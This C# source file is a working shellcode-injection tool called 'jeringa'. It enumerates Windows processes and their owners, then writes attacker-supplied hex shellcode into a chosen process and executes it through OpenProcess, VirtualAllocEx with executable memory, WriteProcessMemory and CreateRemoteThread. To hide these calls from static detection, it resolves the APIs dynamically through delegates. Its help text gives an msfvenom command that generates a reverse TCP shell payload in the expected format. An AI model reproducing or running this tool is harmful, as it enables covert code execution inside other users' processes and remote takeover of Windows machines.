using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System;
using System.Linq;


namespace jeringa
{
    class Program
    {
        //[DllImport("Kernel32.dll", CharSet = CharSet.Ansi)] private static extern IntPtr LoadLibrary(string path);
        // [DllImport("coredll.dll", EntryPoint = "GetProcAddressW", SetLastError = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
        //[DllImport("Kernel32.dll", CharSet = CharSet.Ansi)] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1); // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
        
        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // [DllImport("advapi32.dll", SetLastError = true)] private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        // [DllImport("kernel32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)] private static extern bool CloseHandle(IntPtr hObject);
        // [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        // [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        // [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
        delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        delegate bool CloseHandleDelegate(IntPtr hObject);
        delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
       
        
        private static string getProcessOwner(Process process)
        {
            IntPtr processHandle = IntPtr.Zero;
            try
            {
                // Delegates 
                IntPtr a32 = GetModuleHandle("advapi32.dll");
                IntPtr addrOpenProcessToken = GetProcAddress(a32, "OpenProcessToken");
                OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
                auxOpenProcessToken(process.Handle, 8, out processHandle);
                WindowsIdentity wi = new WindowsIdentity(processHandle);
                string user = wi.Name;
                return user;
            }
            catch
            {
                return "N/A";
            }
            finally
            {
                if (processHandle != IntPtr.Zero)
                {
                    // Delegates 
                    IntPtr k32 = GetModuleHandle("kernel32.dll");
                    IntPtr addrCloseHandle = GetProcAddress(k32, "CloseHandle");
                    CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
                    auxCloseHandle(processHandle);
                }
            }
        }

        static Dictionary<string, string> getProcessPids(String process_name)
        {
            Dictionary<string, string> user_pid = new Dictionary<string, string>();
            Process[] processCollection = { };
            if (process_name == "all")
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    String pid = targetProcess.Id.ToString();
                    user_pid.Add(pid, processOwner);
                }
            }
            else
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    if ((targetProcess.ProcessName.ToLower() == process_name.ToLower()) || (processOwner.ToLower().Contains(process_name.ToLower())))
                    {
                        String pid = targetProcess.Id.ToString();
                        user_pid.Add(pid, processOwner);
                    }
                }
                /*
                processCollection = Process.GetProcessesByName(process_name);
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    String pid = targetProcess.Id.ToString();
                    user_pid.Add(pid, processOwner);
                }
                */
                /*
                List<String> owners = new List<String>();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    String pid = targetProcess.Id.ToString();
                    Boolean newOwner = true;
                    for (int j = 0; j < owners.Count; j++)
                    {
                        if (processOwner == owners[j])
                        {
                            newOwner = false;
                        }
                    }
                    if (newOwner == true)
                    {
                        owners.Add(processOwner);
                        user_pid.Add(pid, processOwner);
                    }

                }
                */
            }

            return user_pid;
        }

        public static byte[] ToByteArray(String hexString)
        {
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        static void injectShellcodeCreateRemoteThread(String processPID, String payload)
        {
            // Delegates 
            IntPtr k32 = GetModuleHandle("kernel32.dll");
            IntPtr addrOpenProcess = GetProcAddress(k32, "OpenProcess");
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, "VirtualAllocEx");
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, "WriteProcessMemory");
            IntPtr addrCreateRemoteThread = GetProcAddress(k32, "CreateRemoteThread");
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateRemoteThread, typeof(CreateRemoteThreadDelegate));

            // Create handle to the process
            // We need (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), we can get the values from https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
            String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
            uint processRights = 0x0010 | 0x0400;
            IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} ({1}) created correctly.", processPID, processname);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} ({1}) is NULL.", processPID, processname);
            }

            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));
            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            if (payload == null)
            {
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }
            // else check url
            ///// 

            // else hexadecimal 
            else
            {
                buf = ToByteArray(payload);
            }

            IntPtr outSize;
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        static void listInfo(Dictionary<string, string> processPIDs)
        {
            Console.WriteLine("{0,40}|{1,10}|{2,20}", "Process Name", "PID", "Process Owner");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 80)));
            foreach (KeyValuePair<string, string> kvp in processPIDs)
            {
                //Console.WriteLine("Name = {0}\tPID = {1}\tUser = {2}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
                Console.WriteLine("{0,40}|{1,10}|{2,20}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
                // Console.WriteLine("[+] " + kvp.Value);
            }

        }

        static void getHelp()
        {
            Console.WriteLine("[+] List processes:");
            Console.WriteLine("Program.exe list all\n");

            Console.WriteLine("[+] List processes with a specific name (\"explorer\") or process owner (\"ricardo\"):");
            Console.WriteLine("Program.exe list explorer");
            Console.WriteLine("Program.exe list \"DESKTOP-MA54241\\ricardo\"\n");

            Console.WriteLine("[+] Inject using process name, process owner and optionally payload in HEX format (if not provided the program requests it):");
            Console.WriteLine("Program.exe inject explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]\n");

            Console.WriteLine("[+] Inject using PID (\"1234\") and optionally payload in HEX format (if not provided the program requests it):");
            Console.WriteLine("Program.exe inject 1234 [ fc4883e4f0e8... ]\n");

            Console.WriteLine("[+] NOTE: You can use your own shellcode or create one in the expected format with Msfvenom:");
            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'\n");

            System.Environment.Exit(0);
        }

        static void Main(string[] args)
        {

            // Check we are running an elevated process
            /*
             * if (WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return;
            }
            */

            if (args.Length < 2)
            {
                getHelp();
            }

            string option = args[0];
            string process_str = args[1];

            Dictionary<string, string> processPIDs = getProcessPids(process_str);

            if (option == "list")
            {
                listInfo(processPIDs);
            }

            else if (option == "inject")
            {
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeCreateRemoteThread(process_str, payload);
                    // injectShellcodeQueueUserAPC (3.6)
                    // injectShellcodeNtCreateThreadEx (3.8)

                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeCreateRemoteThread(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

        }
    }
}
